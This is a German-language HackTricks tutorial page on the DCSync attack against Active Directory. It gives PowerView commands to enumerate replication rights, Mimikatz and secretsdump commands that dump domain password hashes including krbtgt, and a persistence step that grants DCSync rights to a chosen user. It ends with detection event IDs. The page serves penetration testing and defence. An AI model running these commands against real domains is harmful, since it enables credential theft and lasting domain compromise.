# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## DCSync

Die **DCSync**-Berechtigung impliziert, diese Berechtigungen über die Domäne selbst zu haben: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.

**Wichtige Hinweise zu DCSync:**

* Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controllers auf, Informationen zu replizieren**, indem er das Directory Replication Service Remote Protocol (MS-DRSR) verwendet. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht deaktiviert oder abgeschaltet werden.
* Standardmäßig haben nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** die erforderlichen Berechtigungen.
* Wenn Passwörter von Konten mit umkehrbarer Verschlüsselung gespeichert sind, steht in Mimikatz eine Option zur Verfügung, um das Passwort im Klartext zurückzugeben.

### Enumeration

Überprüfen Sie, wer diese Berechtigungen hat, indem Sie `powerview` verwenden:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Lokal ausnutzen
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit Remotely
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiert 3 Dateien:

* eine mit den **NTLM-Hashes**
* eine mit den **Kerberos-Schlüsseln**
* eine mit Klartext-Passwörtern aus dem NTDS für alle Konten, bei denen [**umkehrbare Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Sie können Benutzer mit umkehrbarer Verschlüsselung mit

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistenz

Wenn Sie ein Domänenadministrator sind, können Sie diese Berechtigungen mit Hilfe von `powerview` jedem Benutzer gewähren:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dann können Sie **überprüfen, ob der Benutzer korrekt** die 3 Berechtigungen zugewiesen wurde, indem Sie nach ihnen in der Ausgabe suchen (Sie sollten die Namen der Berechtigungen im Feld "ObjectType" sehen können):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Minderung

* Sicherheitsereignis-ID 4662 (Audit-Policy für Objekt muss aktiviert sein) – Eine Operation wurde an einem Objekt durchgeführt
* Sicherheitsereignis-ID 5136 (Audit-Policy für Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
* Sicherheitsereignis-ID 4670 (Audit-Policy für Objekt muss aktiviert sein) – Berechtigungen auf einem Objekt wurden geändert
* AD ACL Scanner - Erstellen und Vergleichen von Berichten über ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referenzen

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
